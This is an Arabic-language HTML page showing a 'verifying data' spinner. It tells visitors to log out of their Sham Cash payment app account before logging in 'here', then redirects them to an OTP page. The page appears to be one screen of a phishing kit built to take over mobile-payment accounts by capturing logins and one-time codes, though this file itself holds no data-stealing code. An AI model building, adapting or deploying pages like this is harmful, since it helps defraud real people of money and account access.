<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من البيانات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            background: white;
            padding: 60px 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 90%;
        }

        .logo {
            margin-bottom: 40px;
        }

        .logo img {
            max-width: 150px;
            height: auto;
            object-fit: contain;
        }

        .message {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .spinner {
            display: inline-block;
            width: 50px;
            height: 50px;
            margin-bottom: 30px;
        }

        .spinner::after {
            content: "";
            display: block;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 5px solid #667eea;
            border-color: #667eea transparent #667eea transparent;
            animation: spinner 1.2s linear infinite;
        }

        @keyframes spinner {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .status-text {
            font-size: 18px;
            color: red;
            margin-top: 20px;
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin-top: 30px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            animation: progress 5s ease-in-out forwards;
        }

        @keyframes progress {
            0% {
                width: 0%;
            }
            100% {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="assets/logo.png" alt="الشعار">
        </div>
        <div class="spinner"></div>
        <div class="message">ملاحظة هامة! ⚠️</div>
        <div class="status-text">الرجاء تسجيل الخروج من حسابك في تطبيق شام كاش قبل تسجيل الدخول هنا.</div>
            <div class="message">سيتم نقلك تلقائيًا للصفحة التالية.</div>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

    <script>
        // التوجيه التلقائي بعد 5 ثوانٍ
        setTimeout(function() {
            window.location.href = 'otp.html';
        }, 15000);
    </script>
</body>
</html>
